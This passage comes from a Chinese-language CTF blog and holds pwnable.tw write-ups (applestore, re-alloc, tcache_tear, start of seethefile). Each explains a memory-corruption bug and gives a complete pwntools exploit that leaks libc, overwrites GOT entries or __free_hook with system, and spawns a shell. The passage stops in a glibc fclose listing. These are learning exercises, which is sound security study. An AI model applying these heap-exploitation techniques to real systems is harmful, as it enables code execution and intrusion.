class="line">free_hook=libc_base+libc.symbols[&#x27;__free_hook&#x27;]</span><br><span class="line">print(hex(free_hook-0x28))</span><br><span class="line">system=libc_base+libc.symbols[&#x27;system&#x27;]</span><br><span class="line"></span><br><span class="line">io.sendlineafter(&#x27;f1agaa\n&#x27;,str(free_hook-0x28))</span><br><span class="line">#gdb.attach(io)</span><br><span class="line">sleep(0.2)</span><br><span class="line">io.sendlineafter(&#x27;f1agaa\n&#x27;,str(system))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>遇到这种题应该多注意uaf、doublefree、off-by-null、栈溢出、堆溢出这几种简单的漏洞，多注意free、malloc函数以及read函数。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>pwnable.tw刷题记录</title>
      <link href="/2021/10/21/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2021/10/21/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h2 id="pwnable-tw刷题记录"><a href="#pwnable-tw刷题记录" class="headerlink" title="pwnable.tw刷题记录"></a>pwnable.tw刷题记录</h2><span id="more"></span><h3 id="1-applestore-假unlink劫持ebp"><a href="#1-applestore-假unlink劫持ebp" class="headerlink" title="1.applestore(假unlink劫持ebp)"></a>1.applestore(假unlink劫持ebp)</h3><p>这个题实现了一个双向列表的插入和删除操作，实话实说这个题是真的绕。</p><p>这个题的漏洞在于栈的地址被写入到了堆上，且栈的区域可控。如下图所示，并没有申请一个堆块而是直接利用栈中的区域作为堆块被插入到了链表中。（后面都将这块栈区域命名为v2）</p><p><img src="/2021/10/21/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211021223113162.png" class="lazyload placeholder" data-srcset="/2021/10/21/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211021223113162.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20211021223113162"></p><p>又因为当checkout函数执行结束后会释放掉栈帧，其他和他同级的函数被调用时重复使用到其栈帧，所以说我们可以控制这一块栈区域。</p><p>因为v2距离ebp的距离为0x20。且其同级函数cart()或dele()他们的buf变量也距离ebp为0x20，所以我们可以通过写入这两个函数的buf变量来改变被插入链表中的v2的值。</p><p><img src="/2021/10/21/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211021224313910.png" class="lazyload placeholder" data-srcset="/2021/10/21/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211021224313910.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20211021224313910"></p><p>可以看见buf是my_read函数的参数，因此我们可以利用my_read函数来修改v2的fd指针和bk指针。到这里后我原本的思路是将fd指针写入system的地址，bk指针写入atoi_got-8的地址。但是发现system地址并不在可写段上，所以在进行dele操作时会报错。</p><p>dele操作如下图所示，先找到要删除的chunk（victim）的bk指针所指向的bck，也就是<code>bck=victim-&gt;bk</code>,然后<code>bck-&gt;fd=victim-&gt;fd</code>,接着<code>victim-&gt;fd-&gt;bk=bck</code>这样victim就脱离了双向列表。</p><p><img src="/2021/10/21/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211022154110982.png" class="lazyload placeholder" data-srcset="/2021/10/21/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211022154110982.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20211022154110982"></p><p>报错后，就傻了，想不到绕过的方法了，看了别人的wp后我只能说绝！</p><p>思路就是劫持ebp，使ebp的值变为atoi_got+0x22这样当执行dele操作时，buf变量的位置就会变为ebp-0x22也就是atoi_got+0x22-0x22，因此就可以改写atoi的got表。</p><p>完整exp：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#io=process(&#x27;./applestore&#x27;)</span><br><span class="line">io=remote(&#x27;chall.pwnable.tw&#x27;, 10104)</span><br><span class="line">elf=ELF(&#x27;./applestore&#x27;)</span><br><span class="line">#libc=elf.libc</span><br><span class="line">libc=ELF(&#x27;./libc_32.so.6&#x27;)</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">read_got=elf.got[&#x27;read&#x27;]</span><br><span class="line">atoi_plt=elf.plt[&#x27;atoi&#x27;]</span><br><span class="line">atoi_got=elf.got[&#x27;atoi&#x27;]</span><br><span class="line"></span><br><span class="line">def ls():</span><br><span class="line">io.sendlineafter(&#x27;&gt; &#x27;,&#x27;1&#x27;)</span><br><span class="line"></span><br><span class="line">def add(num):</span><br><span class="line">io.sendlineafter(&#x27;&gt; &#x27;,&#x27;2&#x27;)</span><br><span class="line">io.sendlineafter(&#x27;Number&gt; &#x27;,str(num))</span><br><span class="line"></span><br><span class="line">def dele(num):</span><br><span class="line">io.sendlineafter(&#x27;&gt; &#x27;,&#x27;3&#x27;)</span><br><span class="line">io.sendlineafter(&#x27;Item Number&gt; &#x27;,num)</span><br><span class="line"></span><br><span class="line">def cart(context):</span><br><span class="line">io.sendlineafter(&#x27;&gt; &#x27;,&#x27;4&#x27;)</span><br><span class="line">io.sendafter(&#x27;ok? (y/n) &gt; &#x27;,context)</span><br><span class="line"></span><br><span class="line">def checkout():</span><br><span class="line">io.sendlineafter(&#x27;&gt; &#x27;,&#x27;5&#x27;)</span><br><span class="line">io.sendlineafter(&#x27;ok? (y/n) &gt; &#x27;,&#x27;y&#x27;)</span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">for i in range(6):</span><br><span class="line">add(1)</span><br><span class="line">for i in range(20):</span><br><span class="line">add(2)</span><br><span class="line"></span><br><span class="line">checkout()</span><br><span class="line">cart(&#x27;y&#x27;+&#x27;\x00&#x27;+p32(read_got)+p32(1)+p32(0))</span><br><span class="line">read=u32(io.recvuntil(&#x27;\xf7&#x27;)[-4:])</span><br><span class="line">libc_base=read-libc.symbols[&#x27;read&#x27;]</span><br><span class="line">print(&#x27;libc_base&#x27;,hex(libc_base))</span><br><span class="line">system=libc.symbols[&#x27;system&#x27;]+libc_base</span><br><span class="line">environ=libc.symbols[&#x27;_environ&#x27;]+libc_base</span><br><span class="line">cart(&#x27;y\x00&#x27;+p32(environ)+p32(1)+p32(0))</span><br><span class="line">io.recvuntil(&#x27;27: &#x27;)</span><br><span class="line">stack=u32(io.recv(4))-0x104-8</span><br><span class="line">print(&#x27;stack&#x27;,hex(stack))</span><br><span class="line"></span><br><span class="line">#gdb.attach(io)</span><br><span class="line">dele(&#x27;27\x00\x00\x00\x00&#x27;+p32(1)+p32(atoi_got+0x22)+p32(stack))                       </span><br><span class="line">io.sendlineafter(&#x27;&gt; &#x27;,p32(system)+&#x27;;/bin/sh\x00&#x27;)</span><br><span class="line">io.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure><p>在这里还有一个小知识点就是atoi()不会识别\x00之后的字符。</p><h3 id="2-re-alloc-realloc的妙用"><a href="#2-re-alloc-realloc的妙用" class="headerlink" title="2.re-alloc(realloc的妙用)"></a>2.re-alloc(realloc的妙用)</h3><p>首先我们回顾一下realloc函数的用法：</p><p>realloc 函数可以身兼 malloc 和 free 两个函数的功能 .。</p><ul><li>当realloc(ptr,size)的size不等于ptr的size时<ul><li>如果申请size&gt;原来size<ul><li>如果chunk与top chunk相邻，直接扩展这个chunk到新size大小</li><li>如果chunk与top chunk不相邻，相当于free(ptr),malloc(new_size)</li></ul></li><li>如果申请size&lt;原来size<ul><li>如果相差不足以容得下一个最小chunk(64位下32个字节，32位下16个字节)，则保持不变</li><li>如果相差可以容得下一个最小chunk，则切割原chunk为两部分，free掉后一部分</li></ul></li></ul></li><li>当realloc(ptr,size)的size等于0时，相当于free(ptr)，且返回0。</li><li>当realloc(ptr,size)的size等于ptr的size，不进行任何操作</li></ul><p>这个题的漏洞点就在于当我们输入size为0的时候，chunk被free掉，但由于有<code>if（！v3）</code>这个判断，所以堆指针并不会被置0，即存在uaf漏洞。</p><p><img src="/2021/10/21/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211025191339484.png" class="lazyload placeholder" data-srcset="/2021/10/21/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211025191339484.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20211025191339484"></p><p>因为是libc-2.29版本，所以有tcache，可以直接将chunk释放掉后更改atoll函数的got表。在这里我们将其改为printf函数的plt地址，这样就会造成一个格式化字符串漏洞，我们可以利用其来泄露出libc_base，并且printf的返回值是他打印出的字符数，就可以控制index了。最后将atoll的got表改为system函数的地址即可。</p><p>因为将atoll的got表改为printf的plt地址后，只能操作index=1的chunk，并且只能申请0x20大小的chunk，因此为了方便我们需要在最开始将tcache的0x20大小的位置布置好为atoll的got地址，这样泄露出地址后才能直接申请0x20大小的chunk改其got表，拿到shell。</p><p>exp：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#io=process(&#x27;./re-alloc&#x27;)</span><br><span class="line">io=remote(&#x27;chall.pwnable.tw&#x27; ,10106)</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line">elf=ELF(&#x27;./re-alloc&#x27;)</span><br><span class="line">libc=elf.libc</span><br><span class="line">heap=0x4040b0</span><br><span class="line">atoll_got=elf.got[&#x27;atoll&#x27;]</span><br><span class="line">printf_plt=elf.plt[&#x27;printf&#x27;]</span><br><span class="line">printf_got=elf.got[&#x27;printf&#x27;]</span><br><span class="line"></span><br><span class="line">def add(index,size,context):</span><br><span class="line">io.sendlineafter(&#x27;Your choice: &#x27;,&#x27;1&#x27;)</span><br><span class="line">io.sendlineafter(&#x27;Index:&#x27;,str(index))</span><br><span class="line">io.sendlineafter(&#x27;Size:&#x27;,str(size))</span><br><span class="line">io.sendafter(&#x27;Data:&#x27;,context)</span><br><span class="line"></span><br><span class="line">def readd(index,size,context):</span><br><span class="line">io.sendlineafter(&#x27;Your choice: &#x27;,&#x27;2&#x27;)</span><br><span class="line">io.sendlineafter(&#x27;Index:&#x27;,str(index))</span><br><span class="line">io.sendlineafter(&#x27;Size:&#x27;,str(size))</span><br><span class="line">io.sendafter(&#x27;Data:&#x27;,context)</span><br><span class="line"></span><br><span class="line">def redele(index,size):</span><br><span class="line">io.sendlineafter(&#x27;Your choice: &#x27;,&#x27;2&#x27;)</span><br><span class="line">io.sendlineafter(&#x27;Index:&#x27;,str(index))</span><br><span class="line">io.sendlineafter(&#x27;Size:&#x27;,str(size))</span><br><span class="line"></span><br><span class="line">def dele(index):</span><br><span class="line">io.sendlineafter(&#x27;Your choice: &#x27;,&#x27;3&#x27;)</span><br><span class="line">io.sendlineafter(&#x27;Index:&#x27;,str(index))</span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">add(0,0x10,&#x27;a&#x27;)</span><br><span class="line">redele(0,0)</span><br><span class="line">readd(0,0x10,p64(atoll_got))</span><br><span class="line">add(1,0x10,&#x27;b&#x27;*0x10)</span><br><span class="line">readd(0,0x20,&#x27;c&#x27;*0x10)</span><br><span class="line">dele(0)</span><br><span class="line">readd(1,0x20,&#x27;d&#x27;*0x10)</span><br><span class="line">dele(1)</span><br><span class="line"></span><br><span class="line">add(0,0x68,&#x27;a&#x27;)</span><br><span class="line">add(1,0x68,&#x27;a&#x27;)</span><br><span class="line">dele(0)</span><br><span class="line">redele(1,0)</span><br><span class="line">readd(1,0x68,p64(atoll_got))</span><br><span class="line">add(0,0x68,&#x27;a&#x27;*0x68)</span><br><span class="line">readd(0,0x78,&#x27;b&#x27;*0x60)</span><br><span class="line">dele(0)</span><br><span class="line">readd(1,0x68,&#x27;\x00&#x27;*0x10)</span><br><span class="line">add(0,0x68,p64(printf_plt))</span><br><span class="line">#gdb.attach(io)</span><br><span class="line">io.sendlineafter(&#x27;Your choice: &#x27;,&#x27;3&#x27;)</span><br><span class="line">io.sendlineafter(&#x27;Index:&#x27;,&#x27;1\x00&#x27;)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(&#x27;Your choice: &#x27;,&#x27;3&#x27;)</span><br><span class="line">io.sendlineafter(&#x27;Index:&#x27;,&#x27;%21$p&#x27;)</span><br><span class="line">libc_start_main=int(io.recv(14),16)-235</span><br><span class="line">libc_base=libc_start_main-libc.symbols[&#x27;__libc_start_main&#x27;]</span><br><span class="line">print(&#x27;libc_base&#x27;,hex(libc_base))</span><br><span class="line">system=libc_base+libc.symbols[&#x27;system&#x27;]</span><br><span class="line">atoll=libc_base+libc.symbols[&#x27;atoll&#x27;]</span><br><span class="line"></span><br><span class="line">io.sendlineafter(&#x27;Your choice: &#x27;,&#x27;1&#x27;)</span><br><span class="line">io.sendafter(&#x27;Index:&#x27;,&#x27;a\x00&#x27;)</span><br><span class="line">io.sendafter(&#x27;Size:&#x27;,&#x27;a&#x27;*0x10)</span><br><span class="line">io.sendafter(&#x27;Data:&#x27;,p64(system))</span><br><span class="line">io.sendlineafter(&#x27;Your choice: &#x27;,&#x27;1&#x27;)</span><br><span class="line">io.sendafter(&#x27;Index:&#x27;,&#x27;/bin/sh\x00&#x27;)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure><h3 id="3-tcache-tear-fakechunk构造需要连续三个"><a href="#3-tcache-tear-fakechunk构造需要连续三个" class="headerlink" title="3.tcache_tear(fakechunk构造需要连续三个)"></a>3.tcache_tear(fakechunk构造需要连续三个)</h3><p>这个题有两个漏洞点，一个在free后指针没有置0，另一个在申请一个后，对堆进行写操作时有<code>size-16</code>,只要size小于16就会造成堆溢出。在做题的时候我只用到了第一个漏洞。</p><p><img src="/2021/10/21/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211026204705480.png" class="lazyload placeholder" data-srcset="/2021/10/21/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211026204705480.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20211026204705480"></p><p><img src="/2021/10/21/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211026204945871.png" class="lazyload placeholder" data-srcset="/2021/10/21/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211026204945871.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20211026204945871"></p><p>因为是libc-2.27-3ubuntu1，并没有打补丁，所以tcache并不会检查doublefree，所以我们先申请一个chunk然后free两次，在申请一个相同大小的chunk，就可以控制freechunk中的fd指针。</p><p><img src="/2021/10/21/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211026205228948.png" class="lazyload placeholder" data-srcset="/2021/10/21/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211026205228948.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20211026205228948"></p><p>我们发现show操作只能输出bss段上的值，所以我们要将堆块申请到bss段上。我们先输入name为<code>p64(0)+p64(0x421)</code>先构造出chunk头。接着将freechunk的fd指针指向bss+0x10（因为tcache指向chunk+0x10）。因为我们是要准备free掉这个0x420大小的chunk，所以必须得在他下面写入<code>p64(0)+p64(0x21)</code>,然后在free，但这时候却报错了，错误提示如下：</p><p><img src="/2021/10/21/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211026210706201.png" class="lazyload placeholder" data-srcset="/2021/10/21/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211026210706201.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20211026210706201"></p><p>查看源码发现会检查nextchunk的下一个chunk的inuse位，如果为0则会向前合并，并且调用unlink函数，而libc-2.27相对于libc-2.23来说增加了<code>if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))</code>对prevsize的检查。所以我们必须在nextchunk下也写入<code>p64(0)+p64(0x21)</code>这样大小为0x420的chunk才能被放入unsortedbin中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">    /* consolidate backward */</span><br><span class="line">    if (!prev_inuse(p)) &#123;</span><br><span class="line">      prevsize = prev_size (p);</span><br><span class="line">      size += prevsize;</span><br><span class="line">      p = chunk_at_offset(p, -((long) prevsize));</span><br><span class="line">      unlink(av, p, bck, fwd);</span><br><span class="line">    &#125;</span><br><span class="line">    if (nextchunk != av-&gt;top) &#123;</span><br><span class="line">      /* get and clear inuse bit */</span><br><span class="line">      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line">      /* consolidate forward */</span><br><span class="line">      if (!nextinuse) &#123;</span><br><span class="line">unlink(av, nextchunk, bck, fwd);</span><br><span class="line">size += nextsize;</span><br><span class="line">      &#125; else</span><br><span class="line">clear_inuse_bit_at_offset(nextchunk, 0);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/* Take a chunk off a bin list */</span><br><span class="line">#define unlink(AV, P, BK, FD) &#123;                                            \</span><br><span class="line">    if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \</span><br><span class="line">      malloc_printerr (&quot;corrupted size vs. prev_size&quot;);      \</span><br><span class="line">    FD = P-&gt;fd;      \</span><br><span class="line">    BK = P-&gt;bk;      \</span><br><span class="line">    if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))      \</span><br><span class="line">      malloc_printerr (&quot;corrupted double-linked list&quot;);      \</span><br><span class="line">    else &#123;      \</span><br><span class="line">        FD-&gt;bk = BK;      \</span><br><span class="line">        BK-&gt;fd = FD;      \</span><br><span class="line">        if (!in_smallbin_range (chunksize_nomask (P))      \</span><br><span class="line">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123;      \</span><br><span class="line">    if (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)      \</span><br><span class="line">|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))    \</span><br><span class="line">      malloc_printerr (&quot;corrupted double-linked list (not small)&quot;);   \</span><br><span class="line">            if (FD-&gt;fd_nextsize == NULL) &#123;      \</span><br><span class="line">                if (P-&gt;fd_nextsize == P)      \</span><br><span class="line">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;      \</span><br><span class="line">                else &#123;      \</span><br><span class="line">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;      \</span><br><span class="line">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;      \</span><br><span class="line">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;      \</span><br><span class="line">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;      \</span><br><span class="line">                  &#125;      \</span><br><span class="line">              &#125; else &#123;      \</span><br><span class="line">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;      \</span><br><span class="line">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;      \</span><br><span class="line">              &#125;      \</span><br><span class="line">          &#125;      \</span><br><span class="line">      &#125;      \</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后就能泄露libc的基地址了，打free_hook拿shell</p><p>exp：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io=process(&#x27;./tcache_tear&#x27;)</span><br><span class="line">#io=remote(&#x27;chall.pwnable.tw&#x27; ,10207)</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line">heap=0x602060</span><br><span class="line">elf=ELF(&#x27;./tcache_tear&#x27;)</span><br><span class="line">libc=elf.libc</span><br><span class="line"></span><br><span class="line">def add(size,content):</span><br><span class="line">io.sendlineafter(&#x27;choice :&#x27;,&#x27;1&#x27;)</span><br><span class="line">io.sendlineafter(&#x27;Size:&#x27;,str(size))</span><br><span class="line">io.sendlineafter(&#x27;Data:&#x27;,content)</span><br><span class="line"></span><br><span class="line">def dele():</span><br><span class="line">io.sendlineafter(&#x27;choice :&#x27;,&#x27;2&#x27;)</span><br><span class="line"></span><br><span class="line">def show():</span><br><span class="line">io.sendlineafter(&#x27;choice :&#x27;,&#x27;3&#x27;)</span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">io.sendlineafter(&#x27;Name:&#x27;,p64(0)+p64(0x421))</span><br><span class="line">add(0x78,&#x27;a&#x27;)</span><br><span class="line">dele()</span><br><span class="line">dele()</span><br><span class="line">add(0x78,p64(heap+0x420))</span><br><span class="line">add(0x78,&#x27;a&#x27;)</span><br><span class="line">add(0x78,p64(0)+p64(0x21))#+p64(0)+p64(0)+p64(0)+p64(0x21))</span><br><span class="line">add(0x68,&#x27;a&#x27;)</span><br><span class="line">dele()</span><br><span class="line">dele()</span><br><span class="line">add(0x68,p64(heap+0x10))</span><br><span class="line">add(0x68,&#x27;a&#x27;)</span><br><span class="line">add(0x68,&#x27;heap&#x27;)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">dele()</span><br><span class="line">show()</span><br><span class="line">malloc_hook=u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,&#x27;\x00&#x27;))-96-16</span><br><span class="line">libc_base=malloc_hook-libc.symbols[&#x27;__malloc_hook&#x27;]</span><br><span class="line">print(&#x27;libc_base&#x27;,hex(libc_base))</span><br><span class="line">free_hook=libc_base+libc.symbols[&#x27;__free_hook&#x27;]</span><br><span class="line">system=libc_base+libc.symbols[&#x27;system&#x27;]</span><br><span class="line"></span><br><span class="line">add(0x38,&#x27;a&#x27;)</span><br><span class="line">dele()</span><br><span class="line">dele()</span><br><span class="line">add(0x38,p64(free_hook-8))</span><br><span class="line">add(0x38,&#x27;a&#x27;)</span><br><span class="line">add(0x38,&#x27;/bin/sh\x00&#x27;+p64(system))</span><br><span class="line">dele()</span><br><span class="line">io.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure><h3 id="4-seethefile（伪造IO-FILE结构体）"><a href="#4-seethefile（伪造IO-FILE结构体）" class="headerlink" title="4.seethefile（伪造IO_FILE结构体）"></a>4.seethefile（伪造IO_FILE结构体）</h3><p>这个题实现了一个可以读取并输出服务器上的任意文件的功能。漏洞点在退出时的scanf(“%s”,name)这里没有对长度进行限制可以溢出，可以覆盖掉fp这个IO_FILE指针，我们只需要伪造一个IO_FILE结构就行。</p><p><img src="/2021/10/21/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211027214805158.png" class="lazyload placeholder" data-srcset="/2021/10/21/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211027214805158.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20211027214805158"></p><p><img src="/2021/10/21/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211027215049499.png" class="lazyload placeholder" data-srcset="/2021/10/21/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211027215049499.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20211027215049499"></p><p>fopen函数的操作简单概括就是：</p><ul><li>使用 malloc 分配 FILE 结构</li><li>设置 FILE 结构的 vtable</li><li>初始化分配的 FILE 结构</li><li>将初始化的 FILE 结构链入 FILE 结构链表中</li><li>调用系统调用打开文件</li></ul><p>fclose函数的源码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span 